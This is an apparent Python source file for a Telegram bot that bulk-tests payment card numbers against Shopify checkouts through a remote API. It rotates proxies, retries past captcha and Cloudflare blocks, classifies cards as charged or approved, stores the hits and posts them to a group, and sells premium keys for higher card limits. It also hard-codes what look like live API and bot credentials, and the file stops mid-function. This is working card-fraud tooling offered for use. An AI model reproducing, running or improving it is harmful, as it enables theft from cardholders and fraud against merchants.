from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
import requests, random, datetime, json, os, re, asyncio, time
import string
import hashlib
import aiohttp
import aiofiles
from urllib.parse import urlparse, quote

# Import database
from database import (
    init_db, db,
    ensure_user, get_user, is_premium_user, add_premium_user, remove_premium,
    is_banned_user, ban_user, unban_user,
    create_key, get_key_data, use_key, get_all_keys,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db, clear_user_sites, set_user_sites,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail
)

# Config
API_ID = 36442788
API_HASH = "a46cfef94ef9de4026597c6a4addf073"
BOT_TOKEN = "8623563609:AAHch7XzA49AuymwVS-tBzDSaO6TdhPaUWA"
ADMIN_ID = [8772814136]
GROUP_ID = -1003886412726

# API Base URL
API_BASE_URL = "http://5.45.126.118:5000/shopify"

ACTIVE_MTXT_PROCESSES = {}
TEMP_WORKING_SITES = {}
USER_APPROVED_PREF = {}


# --- Utility Functions ---

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))


async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "BIN Info Not Found", "-", "-", "-", "-", "🏳️"
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '🏳️')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return "-", "-", "-", "-", "-", "🏳️"
    except Exception:
        return "-", "-", "-", "-", "-", "🏳️"


def normalize_card(text):
    if not text:
        return None
    text = text.replace('\n', ' ').replace('/', ' ')
    numbers = re.findall(r'\d+', text)
    cc = mm = yy = cvv = ''
    for part in numbers:
        if len(part) == 16:
            cc = part
        elif len(part) == 4 and part.startswith('20'):
            yy = part[2:]
        elif len(part) == 2 and int(part) <= 12 and mm == '':
            mm = part
        elif len(part) == 2 and not part.startswith('20') and yy == '':
            yy = part
        elif len(part) in [3, 4] and cvv == '':
            cvv = part
    if cc and mm and yy and cvv:
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None


def extract_json_from_response(response_text):
    if not response_text:
        return None
    start_index = response_text.find('{')
    if start_index == -1:
        return None
    brace_count = 0
    end_index = -1
    for i in range(start_index, len(response_text)):
        if response_text[i] == '{':
            brace_count += 1
        elif response_text[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                end_index = i
                break
    if end_index == -1:
        return None
    json_text = response_text[start_index:end_index + 1]
    try:
        return json.loads(json_text)
    except json.JSONDecodeError:
        return None


async def get_user_proxy(user_id):
    """Get a random proxy for a specific user from DB"""
    return await get_random_proxy(user_id)


async def remove_dead_proxy(user_id, proxy_url):
    """Remove a dead proxy from user's list in DB"""
    await remove_proxy_by_url(user_id, proxy_url)


def build_api_url(site, cc, proxy_data=None):
    """Build the full API URL with parameters"""
    if not site.startswith('http'):
        site = f'https://{site}'

    # Build proxy string if available
    proxy_str = None
    if proxy_data:
        ip = proxy_data.get('ip')
        port = proxy_data.get('port')
        username = proxy_data.get('username')
        password = proxy_data.get('password')
        if username and password:
            proxy_str = f"{ip}:{port}:{username}:{password}"
        else:
            proxy_str = f"{ip}:{port}"

    # Encode parameters
    encoded_cc = quote(cc, safe='')
    encoded_site = quote(site, safe='')

    url = f'{API_BASE_URL}?site={encoded_site}&cc={encoded_cc}'
    if proxy_str:
        encoded_proxy = quote(proxy_str, safe='')
        url += f'&proxy={encoded_proxy}'

    return url


# ---- SITE ERROR / RETRYABLE responses ----
SITE_ERROR_KEYWORDS = [
    'r4 token empty',
    'payment method is not shopify',
    'r2 id empty',
    'product not found',
    'hcaptcha detected',
    'hcaptcha_detected',
    'tax ammount empty',
    'tax amount empty',
    'del ammount empty',
    'product id is empty',
    'py id empty',
    'clinte token',
    'receipt_empty',
    'receipt id is empty',
    'receipt empty',
    'na',
    'site error! status: 429',
    'site error! status: 404',
    'site error! status: 401',
    'site error! status: 402',
    'site requires login',
    'failed to get token',
    'no valid products',
    'not shopify',
    'failed to get checkout',
    'captcha at checkout',
    'site not supported for now',
    'site not supported',
    'connection error',
    'error processing card',
    '504',
    'server error',
    'client error',
    'amount_too_small',
    'amount too small',
    'payments_positive_amount_expected',
    'change proxy or site',
    'token not found',
    'invalid_response',
    'resolve',
    'curl error',
    'could not resolve host',
    'connect tunnel failed',
    'failed to tokenize card',
    'site error',
    'site dead',
    'proxy dead',
    'failed to get session token',
    'handle is empty',
    'payment method identifier is empty',
    'invalid url',
    'error in 1st req',
    'error in 1 req',
    'cloudflare',
    'connection failed',
    'timed out',
    'access denied',
    'tlsv1 alert',
    'ssl routines',
    'could not resolve',
    'domain name not found',
    'name or service not known',
    'openssl ssl_connect',
    'empty reply from server',
    'httperror504',
    'http error',
    'timeout',
    'unreachable',
    'ssl error',
    '502',
    '503',
    'bad gateway',
    'service unavailable',
    'gateway timeout',
    'network error',
    'connection reset',
    'failed to detect product',
    'failed to create checkout',
    'failed to get proposal data',
    'submit rejected',
    'handle error',
    'http 404',
    'delivery_delivery_line_detail_changed',
    'delivery_address2_required',
    'url rejected',
    'malformed input',
    'captcha_required',
    'captcha required',
    'site errors',
    'failed',
    'merchandise',
    'merchandise_not_enough_stock_on_variant',
    'item',
]


def is_site_error(response_text):
    if not response_text:
        return True
    response_lower = response_text.lower().strip()
    if response_lower == 'na':
        return True
    for keyword in SITE_ERROR_KEYWORDS:
        if keyword in response_lower:
            return True
    return False


def is_site_dead(response_text):
    return is_site_error(response_text)


def classify_api_response(response_json):
    api_response = str(response_json.get('Response', ''))
    api_status = response_json.get('Status', False)
    price = response_json.get('Price', '-')
    gateway = response_json.get('Gateway', 'Shopify')

    if price is not None and price != '-':
        price = f"${price}"

    response_lower = api_response.lower()

    if is_site_error(api_response):
        return {
            "Response": api_response,
            "Price": price,
            "Gateway": gateway,
            "Status": "SiteError"
        }

    charged_keywords = [
        "order_paid", "order_placed", "order confirmed",
        "thank you", "payment successful", "order completed",
        "charged", "order_created"
    ]

    approved_keywords = [
        "otp_required", "otp required",
        "3d_authentication", "3ds_required", "3d required", "3d_redirect",
        "authentication_required",
        "insufficient_funds", "insufficient funds",
        "invalid_cvc", "invalid_cvv",
        "ccn live cvv",
    ]

    declined_keywords = [
        "generic_decline", "generic decline",
        "do_not_honor", "do not honor",
        "stolen_card", "lost_card",
        "pickup_card", "pick_up_card",
        "restricted_card", "restricted card",
        "fraudulent", "fraud suspected", "fraud_suspected",
        "expired_card", "expired card",
        "transaction_not_allowed", "transaction not allowed",
        "card_declined", "card declined",
        "processor_declined", "processor declined",
        "card_not_supported", "card not supported",
        "currency_not_supported",
        "duplicate_transaction",
        "revocation_of_authorization",
        "no_action_taken",
        "try_again_later",
        "not_permitted",
        "decline",
        "your card was declined",
        "payment_intent_authentication_failure",
        "avs_check_failed",
        "incorrect number",
        "incorrect_number",
    ]

    if any(kw in response_lower for kw in charged_keywords):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}

    if any(kw in response_lower for kw in declined_keywords):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Declined"}

    if any(kw in response_lower for kw in approved_keywords):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}

    if api_status is True:
        if not any(word in response_lower for word in ["decline", "denied", "failed", "error", "rejected", "refused", "fraud"]):
            return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}

    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Declined"}


async def call_shopify_api(site, cc, proxy_data=None):
    """Central function to call the Shopify API"""
    url = build_api_url(site, cc, proxy_data)

    timeout = aiohttp.ClientTimeout(total=120)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(url) as res:
            if res.status != 200:
                return None, f"HTTP_ERROR_{res.status}"

            try:
                response_json = await res.json()
                return response_json, None
            except Exception:
                response_text = await res.text()
                # Try to extract JSON from response text
                extracted = extract_json_from_response(response_text)
                if extracted:
                    return extracted, None
                return None, f"Invalid JSON: {response_text[:100]}"


async def check_card_random_site(card, sites, user_id=None):
    if not sites:
        return {"Response": "ERROR", "Price": "-", "Gateway": "-", "Status": "Error"}, -1
    selected_site = random.choice(sites)
    site_index = sites.index(selected_site) + 1

    proxy_data = await get_user_proxy(user_id) if user_id else None

    try:
        response_json, error = await call_shopify_api(selected_site, card, proxy_data)

        if error:
            return {"Response": error, "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index

        result = classify_api_response(response_json)
        return result, site_index

    except asyncio.TimeoutError:
        return {"Response": "API Timeout (120s)", "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}, site_index


async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_user_proxy(user_id) if user_id else None

    try:
        response_json, error = await call_shopify_api(site, card, proxy_data)

        if error:
            return {"Response": error, "Price": "-", "Gateway": "-", "Status": "SiteError"}

        # Proxy death check removed - just classify response directly
        result = classify_api_response(response_json)
        return result

    except asyncio.TimeoutError:
        return {"Response": "API Timeout (120s)", "Price": "-", "Gateway": "-", "Status": "SiteError"}
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}


async def check_card_with_retry(card, sites, user_id=None, max_retries=3):
    for attempt in range(max_retries):
        if not sites:
            return {"Response": "No sites available", "Price": "-", "Gateway": "-", "Status": "Error"}, -1

        selected_site = random.choice(sites)
        site_index = sites.index(selected_site) + 1

        result = await check_card_specific_site(card, selected_site, user_id)

        if result.get("Status") == "SiteError":
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            else:
                result["Status"] = "Error"
                return result, site_index

        return result, site_index

    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "-", "Status": "Error"}, -1


async def check_card_specific_with_retry(card, site, user_id=None, all_sites=None, max_retries=3):
    last_result = None

    for attempt in range(max_retries):
        if attempt == 0:
            use_site = site
        elif all_sites:
            use_site = random.choice(all_sites)
        else:
            use_site = site

        result = await check_card_specific_site(card, use_site, user_id)
        last_result = result

        if result.get("Status") == "SiteError":
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
                continue
            else:
                result["Status"] = "Error"
                return result

        return result

    if last_result:
        last_result["Status"] = "Error"
        return last_result
    return {"Response": "Max retries exceeded", "Price": "-", "Gateway": "-", "Status": "Error"}


def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return normalize_card(text)


def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)


async def can_use(user_id, chat):
    if await is_banned_user(user_id):
        return False, "banned"

    is_prem = await is_premium_user(user_id)
    is_private = chat.id == user_id

    if is_private:
        if is_prem:
            return True, "premium_private"
        else:
            return False, "no_access"
    else:
        if is_prem:
            return True, "premium_group"
        else:
            return True, "group_free"


def get_cc_limit(access_type, user_id=None):
    if user_id and user_id in ADMIN_ID:
        return 8000
    if access_type in ["premium_private", "premium_group"]:
        return 8000
    elif access_type == "group_free":
        return 200
    return 0


async def save_approved_card(card, status, response, gateway, price):
    try:
        await save_card_to_db(card, status, response or '', gateway or '', price or '')
    except Exception as e:
        print(f"Error saving card to DB: {str(e)}")


async def pin_charged_message(event, message):
    try:
        if event.is_group:
            await message.pin()
    except Exception as e:
        print(f"Failed to pin message: {e}")


async def send_hit_notification(client_instance, card, result, username, user_id):
    try:
        price = result.get('Price', '-')
        response = result.get('Response', '-')
        gateway = result.get('Gateway', 'Shopify')
        status = result.get('Status', 'Charged')

        brand = result.get('brand', '-')
        bin_type = result.get('type', '-')
        level = result.get('level', '-')
        bank = result.get('bank', '-')
        country = result.get('country', '-')
        flag = result.get('flag', '')
        site = result.get('site', '-')
        elapsed_time = result.get('time', '-')

        if status == "Charged":
            emoji = "💎"
        else:
            emoji = "✅"

        hit_msg = f"""{emoji} 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 {emoji}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
𝗣𝗿𝗶𝗰𝗲 ⇾ {price} 💸
𝗦𝗶𝘁𝗲 ⇾ {site}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝗸 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀

𝐔𝐬𝐞𝐫 ➔ @{username}"""

        await client_instance.send_message(GROUP_ID, hit_msg)

    except Exception as e:
        print(f"Error sending hit notification: {e}")


def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except Exception:
            return False
        domain = parsed.netloc
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(domain_pattern, domain))


def extract_urls_from_text(text):
    clean_urls = set()
    lines = text.split('\n')
    for line in lines:
        cleaned_line = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned_line and is_valid_url_or_domain(cleaned_line):
            clean_urls.add(cleaned_line)
    return list(clean_urls)


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'

    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)

    host = ''
    port = ''
    username = ''
    password = ''

    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy):
        match = re.match(r'^([a-zA-Z0-9\.\-]+):(\d+)@([^:]+):(.+)$', proxy)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        potential_host, potential_port, potential_user, potential_pass = match.groups()
        if 0 < int(potential_port) <= 65535:
            host, port, username, password = potential_host, potential_port, potential_user, potential_pass
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        match = re.match(r'^([^:@]+):(\d+)$', proxy)
        host, port = match.groups()
    else:
        return None

    if not host or not port:
        return None

    try:
        port_num = int(port)
        if port_num <= 0 or port_num > 65535:
            return None
    except ValueError:
        return None

    if username and password:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
        else:
            proxy_url = f'http://{username}:{password}@{host}:{port}'
    else:
        if proxy_type in ['socks5', 'socks4']:
            proxy_url = f'{proxy_type}://{host}:{port}'
        else:
            proxy_url = f'http://{host}:{port}'

    return {
        'ip': host,
        'port': port,
        'username': username if username else None,
        'password': password if password else None,
        'proxy_url': proxy_url,
        'type': proxy_type
    }


async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except Exception as e:
        return False, str(e)


async def test_single_site(site, test_card="4031630422575208|01|2030|280", user_id=None):
    try:
        proxy_data = await get_user_proxy(user_id) if user_id else None

        response_json, error = await call_shopify_api(site, test_card, proxy_data)

        if error:
            return {"status": "dead", "response": error, "site": site, "price": "-"}

        response_msg = response_json.get("Response", "")
        price = response_json.get("Price", "-")
        if price is not None and price != '-':
            price = f"${price}"

        # Proxy death check removed

        if is_site_error(response_msg):
            return {"status": "dead", "response": response_msg, "site": site, "price": price}
        else:
            return {"status": "working", "response": response_msg, "site": site, "price": price}

    except asyncio.TimeoutError:
        return {"status": "dead", "response": "Timeout (120s)", "site": site, "price": "-"}
    except Exception as e:
        return {"status": "dead", "response": str(e), "site": site, "price": "-"}


def get_status_header(status):
    if status == "Charged":
        return "CHARGED 💎"
    elif status == "Approved":
        return "APPROVED ✅"
    elif status == "Proxy Dead":
        return "PROXY DEAD ⚠️"
    elif status == "Error" or status == "SiteError":
        return "~~ ERROR ~~ ⚠️"
    else:
        return "~~ DECLINED ~~ ❌"


client = TelegramClient('cc_bot', API_ID, API_HASH)


def banned_user_message():
    return "🚫 **You Are Banned!**\n\nYou are not allowed to use this bot.\n\nFor appeal, contact @ArxisX"


def access_denied_message_with_button():
    message = "🚫 **Access Denied!** This command requires premium access or group usage."
    buttons = [[Button.url("🚀 Join Group for Free Access", "https://t.me/+4TU0Rp4zCfowZDg9")]]
    return message, buttons


# --- Bot Command Handlers ---

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    await ensure_user(event.sender_id)
    _, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())

    text = """🚀 **@ArxisShopifyBot!**

Here are the available command categories.

** Shopify Self **
`/sh` ⇾ Check a single CC.
`/msh` ⇾ Check multiple CCs from text.
`/mtxt` ⇾ Check CCs from a `.txt` file.
`/ran` ⇾ Check CCs from `.txt` using random sites.

** Bot & User Management **
`/add` <site> ⇾ Add site(s) to your DB.
`/rm` <site> ⇾ Remove site(s) from your DB.
`/check` ⇾ Test your saved sites.
`/info` ⇾ Get your user information.
`/redeem` <key> ⇾ Redeem a premium key.

** Proxy Management (Private Only) **
`/addpxy` <proxy> ⇾ Add proxy (max 10, ip:port:user:pass).
`/proxy` ⇾ View all your saved proxies.
`/rmpxy` <index|all> ⇾ Remove proxy by index or all.
"""

    if access_type in ["premium_private", "premium_group"]:
        text += f"\n💎 **Status:** Premium Access (`{get_cc_limit(access_type, event.sender_id)}` CCs)"
    else:
        text += f"\n🆓 **Status:** Group User (`{get_cc_limit(access_type, event.sender_id)}` CCs)"

    await event.reply(text)


@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await event.reply("Format: /auth {user_id} {days}")
        user_id = int(parts[1])
        days = int(parts[2])
        await ensure_user(user_id)
        await add_premium_user(user_id, days)
        await event.reply(f"✅ User {user_id} has been granted {days} days of premium access!")
        try:
            await client.send_message(user_id, f"🎉 Congratulations!\n\nYou have successfully received {days} days of premium access!\n\nYou can now use the bot in private chat with 500 CC limit!")
        except Exception:
            pass
    except ValueError:
        await event.reply("❌ Invalid user ID or days!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/key'))
async def generate_keys(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            return await event.reply("Format: /key {amount} {days}")
        amount = int(parts[1])
        days = int(parts[2])
        if amount > 10:
            return await event.reply("❌ Maximum 10 keys at once!")
        generated_keys = []
        for _ in range(amount):
            key = generate_key()
            await create_key(key, days)
            generated_keys.append(key)
        keys_text = "\n".join([f"🔑 `{key}`" for key in generated_keys])
        await event.reply(f"✅ Generated {amount} key(s) for {days} day(s):\n\n{keys_text}")
    except ValueError:
        await event.reply("❌ Invalid amount or days!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key_cmd(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /redeem {key}")
        key = parts[1].upper()
        await ensure_user(event.sender_id)

        if await is_premium_user(event.sender_id):
            return await event.reply("❌ You already have premium access!")

        success, result = await use_key(event.sender_id, key)
        if not success:
            return await event.reply(f"❌ {result}")

        await event.reply(f"🎉 Congratulations!\n\nYou have successfully redeemed {result} days of premium access!\n\nYou can now use the bot in private chat with 500 CC limit!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/add'))
async def add_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    try:
        add_text = event.raw_text[4:].strip()
        if not add_text:
            return await event.reply("Format: /add site.com site.com")
        sites_to_add = extract_urls_from_text(add_text)
        if not sites_to_add:
            return await event.reply("❌ No valid urls/domains found!")

        await ensure_user(event.sender_id)
        added_sites = []
        already_exists = []
        for site in sites_to_add:
            success = await add_site_db(event.sender_id, site)
            if success:
                added_sites.append(site)
            else:
                already_exists.append(site)

        response_parts = []
        if added_sites:
            response_parts.append("\n".join(f"✅ Site Successfully Added: {s}" for s in added_sites))
        if already_exists:
            response_parts.append("\n".join(f"⚠️ Already Exists: {s}" for s in already_exists))
        if response_parts:
            await event.reply("\n\n".join(response_parts))
        else:
            await event.reply("❌ No new sites to add!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/rm'))
async def remove_site(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    try:
        rm_text = event.raw_text[3:].strip()
        if not rm_text:
            return await event.reply("Format: /rm site.com")
        sites_to_remove = extract_urls_from_text(rm_text)
        if not sites_to_remove:
            return await event.reply("❌ No valid urls/domains found!")

        removed_sites = []
        not_found_sites = []
        for site in sites_to_remove:
            success = await remove_site_db(event.sender_id, site)
            if success:
                removed_sites.append(site)
            else:
                not_found_sites.append(site)

        response_parts = []
        if removed_sites:
            response_parts.append("\n".join(f"✅ Removed: {s}" for s in removed_sites))
        if not_found_sites:
            response_parts.append("\n".join(f"❌ Not Found: {s}" for s in not_found_sites))
        if response_parts:
            await event.reply("\n\n".join(response_parts))
        else:
            await event.reply("❌ No sites were removed!")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/addpxy'))
async def add_proxy_cmd(event):
    if event.is_group:
        return await event.reply("🔒 This command only works in private chat to protect your proxy!")

    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    try:
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) != 2:
            return await event.reply("Format: /addpxy ip:port:username:password\n")

        proxy_str = parts[1].strip()
        proxy_data = parse_proxy_format(proxy_str)

        if not proxy_data:
            return await event.reply("❌ Invalid proxy format!\n\nUse: ip:port:username:password\n")

        await ensure_user(event.sender_id)
        current_count = await get_proxy_count(event.sender_id)

        if current_count >= 10:
            return await event.reply("❌ Proxy Limit Reached!\n\nYou can only add up to 10 proxies.\nUse /rmpxy to remove old ones.")

        # Check if proxy already exists
        existing_proxies = await get_all_user_proxies(event.sender_id)
        for existing_proxy in existing_proxies:
            if existing_proxy['proxy_url'] == proxy_data['proxy_url']:
                return await event.reply("⚠️ This proxy is already added!")

        proxy_type_display = proxy_data.get('type', 'http').upper()
        testing_msg = await event.reply(f"🔄 Testing {proxy_type_display} proxy...")
        is_working, result = await test_proxy(proxy_data['proxy_url'])

        if not is_working:
            await testing_msg.edit(f"❌ Proxy is not working!\n\nError: {result}")
            return

        await add_proxy_db(event.sender_id, proxy_data)
        new_count = current_count + 1

        auth_display = f"👤 {proxy_data['username']}" if proxy_data.get('username') else "🔓 No Auth"
        await testing_msg.edit(f"✅ Proxy added successfully!\n\n🌐 External IP: {result}\n📍 Proxy: {proxy_data['ip']}:{proxy_data['port']}\n🔐 Type: {proxy_type_display}\n{auth_display}\n📊 Total Proxies: {new_count}/10")

    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/rmpxy'))
async def remove_proxy_cmd(event):
    if event.is_group:
        return await event.reply("🔒 This command only works in private chat!")

    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    try:
        user_proxies = await get_all_user_proxies(event.sender_id)

        if not user_proxies:
            return await event.reply("❌ You don't have any proxy saved!")

        parts = event.raw_text.split(maxsplit=1)

        if len(parts) == 1:
            return await event.reply("Format: /rmpxy <index>\nOr: /rmpxy all\n\nUse /proxy to see index numbers")

        arg = parts[1].strip().lower()

        if arg == 'all':
            count = await clear_all_proxies(event.sender_id)
            return await event.reply(f"✅ All {count} proxies removed successfully!")

        try:
            index = int(arg) - 1
            if index < 0 or index >= len(user_proxies):
                return await event.reply(f"❌ Invalid index!\n\nYou have {len(user_proxies)} proxies (1-{len(user_proxies)})")

            removed_proxy = await remove_proxy_by_index(event.sender_id, index)
            remaining = len(user_proxies) - 1

            await event.reply(f"✅ Proxy removed!\n\n📍 {removed_proxy['ip']}:{removed_proxy['port']}\n📊 Remaining: {remaining}")

        except ValueError:
            return await event.reply("❌ Invalid index!\n\nUse: /rmpxy 1 or /rmpxy all")

    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern='/proxy'))
async def view_proxy(event):
    if event.is_group:
        return await event.reply("🔒 This command only works in private chat!")

    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())

    try:
        user_proxies = await get_all_user_proxies(event.sender_id)

        if not user_proxies:
            return await event.reply("❌ You don't have any proxy saved!\n\nUse /addpxy to add one.")

        proxy_list = f"📡 **Your Proxies** ({len(user_proxies)}/10)\n\n"

        for idx, proxy_data in enumerate(user_proxies, 1):
            proxy_type = proxy_data.get('proxy_type', 'http').upper()
            auth_info = ""
            if proxy_data.get('username'):
                auth_info = f" | 👤 {proxy_data['username']}"

            proxy_list += f"`{idx}.` 🔐 {proxy_type} | 📍 {proxy_data['ip']}:{proxy_data['port']}{auth_info}\n"

        proxy_list += f"\n**ℹ️ Info:**\n• Bot uses random proxy for each check\n• Dead proxies are auto-removed\n• Supports HTTP, HTTPS, SOCKS4, SOCKS5\n• Use `/rmpxy <index>` to remove specific proxy\n• Use `/rmpxy all` to remove all proxies"

        await event.reply(proxy_list)

    except Exception as e:
        await event.reply(f"❌ Error: {e}")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh'))
async def sh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("Use In Group Free", f"https://t.me/+4TU0Rp4zCfowZDg9")]]
        return await event.reply("🚫 Unauthorised Access!\n\nYou can use this bot in group for free!\n\nFor private access, contact @ArxisX", buttons=buttons)
    await ensure_user(event.sender_id)
    asyncio.create_task(process_sh_card(event, access_type))


async def process_sh_card(event, access_type):
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except Exception:
        username = f"user_{event.sender_id}"

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy Required!\n\nPlease add a proxy first using:\n`/addpxy ip:port:username:password`\n\nOr without auth:\n`/addpxy ip:port`")

    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
        if not card:
            return await event.reply("Couldn't extract valid card info from replied message\n\nFormat ➜ /sh 4111111111111111|12|2025|123")
    else:
        card = extract_card(event.raw_text)
        if not card:
            return await event.reply("Format ➜ /sh 4111111111111111|12|2025|123\n\nOr reply to a message containing credit card info", parse_mode="markdown")

    user_sites = await get_user_sites(event.sender_id)
    if not user_sites:
        return await event.reply("You haven't added any URLs. First add using /add")

    loading_msg = await event.reply("🍳")
    start_time = time.time()

    async def animate_loading():
        emojis = ["🍳", "🍳🍳", "🍳🍳🍳", "🍳🍳🍳🍳", "🍳🍳🍳🍳🍳"]
        i = 0
        while True:
            try:
                await loading_msg.edit(emojis[i % 5])
                await asyncio.sleep(0.5)
                i += 1
            except Exception:
                break

    loading_task = asyncio.create_task(animate_loading())
    try:
        res, site_index = await check_card_with_retry(card, user_sites, event.sender_id, max_retries=3)
        loading_task.cancel()
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])

        status = res.get("Status", "Declined")
        response_text_lower = res.get("Response", "").lower()

        if "cloudflare" in response_text_lower:
            status_header = "CLOUDFLARE SPOTTED ⚠️"
            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
            is_charged = False
        elif status == "Error" or status == "SiteError":
            status_header = "~~ ERROR ~~ ⚠️"
            is_charged = False
        else:
            status_header = get_status_header(status)
            is_charged = (status == "Charged")

        if status == "Charged":
            await save_approved_card(card, "CHARGED", res.get('Response'), res.get('Gateway'), res.get('Price'))
        elif status == "Approved":
            await save_approved_card(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))

